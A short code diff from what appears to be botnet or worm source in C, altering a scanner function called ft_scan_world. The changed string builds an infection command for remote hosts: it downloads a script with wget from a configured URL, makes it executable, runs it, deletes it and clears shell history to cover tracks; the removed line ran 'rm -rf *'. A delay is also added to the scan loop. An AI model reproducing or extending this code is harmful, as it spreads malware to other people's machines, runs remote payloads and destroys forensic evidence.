@@ -107,9 +107,9 @@ int matchPrompt(char *bufStr)
 void ft_scan_world(pthread_t thread) // verif si work tjr
 {
 	char	*infectline;
-	infectline = strdup("cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget ");
+	infectline = strdup("cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget -O wget.sh ");
 	infectline = ft_strnjoin(infectline, download_url, ft_strlen(download_url));
-	infectline = ft_strnjoin(infectline, "; chmod 777 gtop.sh; sh gtop.sh; rm -rf *\r\n", 43);
+	infectline = ft_strnjoin(infectline, "; chmod 777 wget.sh; sh wget.sh; rm wget.sh; history -c\r\n", 57);
 	int max = (getdtablesize() / 4) * 3, i, res;
 	fd_set myset;
 	struct timeval tv;
@@ -147,6 +147,7 @@ void ft_scan_world(pthread_t thread) // verif si work tjr
 	timeout.tv_usec = 0;
 	while (1)
 	{
+		sleep(5);
 		for (i = 0; i < max; i++)
 		{
 			switch (fds[i].state)
